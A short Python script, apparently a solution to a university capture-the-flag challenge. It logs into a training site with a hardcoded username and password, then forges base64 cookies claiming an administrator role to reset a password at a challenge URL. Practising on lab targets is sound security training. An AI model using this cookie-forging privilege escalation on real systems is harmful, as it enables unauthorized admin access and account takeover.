import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/b467dbe3cd61babc0ec599fd0c67e359e6fe04e8cdc618d537808cbb693fee8a"

postData = {"newPassword":"5555555555"}
cookieData = {"checksum":"dXNlclJvbGU9YWRtaW5pc3RyYXRvcg==","current":"WVdSdGFXND0="}
response2 = session.post(targetUrl, data=postData, cookies=cookieData)
print(response2.text)
